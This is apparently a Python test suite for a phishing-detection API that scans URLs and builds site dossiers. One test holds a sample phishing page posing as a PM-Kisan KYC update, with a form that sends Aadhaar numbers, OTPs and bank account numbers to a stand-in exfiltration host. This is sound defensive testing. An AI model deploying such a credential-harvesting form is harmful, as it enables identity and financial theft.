"""
Deep AI Website & Domain Intelligence Dossier Integration Test Suite
Validates:
1. Semantic comprehension (About Website, Operator, Category, Key Offerings)
2. Web UI & DOM architecture forensics (Layout, Inputs, Credential Traps, Exfiltration)
3. Domain & Core network forensics (TLD authority, Domain age, SSL CA, DNS MX/SPF)
4. Sovereign PoA Blockchain audit linkage
5. Pre-formatted Executive Dossier Text
"""

import sys
import os

if sys.platform == 'win32' and hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)

def test_deep_ai_analysis_on_gov_portal():
    print("\n--- Test 1: Deep AI Analysis on Genuine Government Portal (PM-Kisan) ---")
    resp = client.post("/api/scan", json={"url": "https://pmkisan.gov.in"})
    assert resp.status_code == 200
    data = resp.json()

    assert "deep_ai_analysis" in data, "deep_ai_analysis missing from scan response"
    deep = data["deep_ai_analysis"]

    # 1. About Website
    assert "about_website" in deep
    about = deep["about_website"]
    assert "PM-Kisan" in about["site_name"]
    assert "Ministry" in about["operator"] or "Agriculture" in about["operator"]
    assert "Sovereign" in about["category"]
    assert len(about["summary_en"]) > 50
    assert len(about.get("key_offerings", [])) >= 2
    print(f"  [OK] Site Name: {about['site_name']}")
    print(f"  [OK] Operator : {about['operator']}")
    print(f"  [OK] Category : {about['category']}")
    print(f"  [OK] Offerings: {', '.join(about['key_offerings'])}")

    # 2. Web UI Analysis
    assert "web_ui_analysis" in deep
    ui = deep["web_ui_analysis"]
    assert "Portal" in ui["layout_type"]
    assert ui["ui_risk_level"] == "SAFE"
    assert len(ui.get("sensitive_inputs_detected", [])) == 0
    print(f"  [OK] UI Layout: {ui['layout_type']}")
    print(f"  [OK] UI Risk  : {ui['ui_risk_level']}")

    # 3. Domain Core Forensics
    assert "domain_core_forensics" in deep
    core = deep["domain_core_forensics"]
    assert "Sovereign" in core["tld_classification"]
    assert "National Informatics Centre" in core["ssl_tls_issuer"] or "Government" in core["ssl_tls_issuer"]
    print(f"  [OK] TLD Auth : {core['tld_classification']}")
    print(f"  [OK] SSL CA   : {core['ssl_tls_issuer']}")

    # 4. Executive Dossier Text
    assert "executive_dossier_text" in deep
    dossier = deep["executive_dossier_text"]
    assert "GOVSHIELD SENTINEL GRID 3.0" in dossier
    assert "[1. WHAT THIS WEBSITE IS ABOUT]" in dossier
    assert "[2. WEB UI & DOM ARCHITECTURE ANALYSIS]" in dossier
    assert "[3. DOMAIN & CORE INFRASTRUCTURE FORENSICS]" in dossier
    assert "[4. SOVEREIGN POA BLOCKCHAIN LEDGER & LINEAGE]" in dossier
    print("  [OK] Executive Dossier pre-formatted text verified.")


def test_deep_ai_analysis_on_commercial_site():
    print("\n--- Test 2: Deep AI Analysis on Known Commercial Platform (Google) ---")
    resp = client.post("/api/scan", json={"url": "https://google.com"})
    assert resp.status_code == 200
    data = resp.json()

    assert "deep_ai_analysis" in data
    about = data["deep_ai_analysis"]["about_website"]
    assert "Google" in about["site_name"]
    assert "Alphabet" in about["operator"] or "Google LLC" in about["operator"]
    print(f"  [OK] Site Name: {about['site_name']}")
    print(f"  [OK] Operator : {about['operator']}")


def test_deep_ai_analysis_on_phishing_clone():
    print("\n--- Test 3: Deep AI Analysis on Phishing Clone Candidate ---")
    phish_payload = {
        "url": "http://pmkisan-aadhaar-kyc.xyz",
        "html_content": (
            "<html><body>"
            "<h1>PM-Kisan 17th Installment KYC Update Required Immediately</h1>"
            "<form action='https://evil-exfil-sink.com/steal.php' method='POST'>"
            "  <input name='aadhaar_number' placeholder='Enter 12 digit Aadhaar'/>"
            "  <input name='otp_code' type='password' placeholder='Enter OTP'/>"
            "  <input name='bank_account' placeholder='Account number'/>"
            "  <button type='submit'>Verify & Claim Rs 6000</button>"
            "</form>"
            "</body></html>"
        )
    }
    resp = client.post("/api/scan", json=phish_payload)
    assert resp.status_code == 200
    data = resp.json()

    assert data["verdict"] in ["PHISHING_CLONE", "MALICIOUS", "SUSPICIOUS"]
    assert "deep_ai_analysis" in data
    deep = data["deep_ai_analysis"]

    # Phishing UI analysis checks
    ui = deep["web_ui_analysis"]
    assert ui["ui_risk_level"] in ["CRITICAL", "HIGH_RISK"]
    assert len(ui.get("sensitive_inputs_detected", [])) >= 1
    assert "Phishing" in ui["layout_type"] or "Credential" in ui["layout_type"]
    print(f"  [OK] Phishing UI Risk: {ui['ui_risk_level']}")
    print(f"  [OK] Detected Traps  : {ui.get('sensitive_inputs_detected')}")
    print(f"  [OK] UI Layout Type  : {ui['layout_type']}")

    # Phishing About Website checks
    about = deep["about_website"]
    assert "Phishing" in about["category"] or "Adversarial" in about["category"] or "Deceptive" in about["category"]
    print(f"  [OK] About Category  : {about['category']}")
    print(f"  [OK] Operator Status : {about['operator']}")


if __name__ == "__main__":
    test_deep_ai_analysis_on_gov_portal()
    test_deep_ai_analysis_on_commercial_site()
    test_deep_ai_analysis_on_phishing_clone()
    print("\n=======================================================")
    print("ALL DEEP AI INTEGRATION TESTS PASSED SUCCESSFULLY! (3/3)")
    print("=======================================================")
